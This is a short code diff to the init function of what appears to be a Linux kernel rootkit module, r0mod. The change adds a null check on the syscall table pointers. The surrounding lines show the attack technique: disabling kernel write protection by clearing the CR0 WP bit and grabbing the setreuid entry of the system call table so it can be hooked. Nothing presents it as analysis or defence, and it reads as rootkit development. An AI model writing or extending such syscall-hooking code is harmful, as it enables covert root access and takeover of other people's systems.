@@ -178,6 +178,12 @@ static int __init r0mod_init(void)
 
     printk("sct hooked @ %lx\n", (unsigned long)sct);
 
+    if(sct == NULL && ia32_sct == NULL)
+    {
+        printk("sct && ia32_sct == NULL ... Exiting!\n");
+        return -1;
+    }
+
     write_cr0(read_cr0() & (~0x10000));
 
     orig_setreuid = (void *)sct[__NR_setreuid];
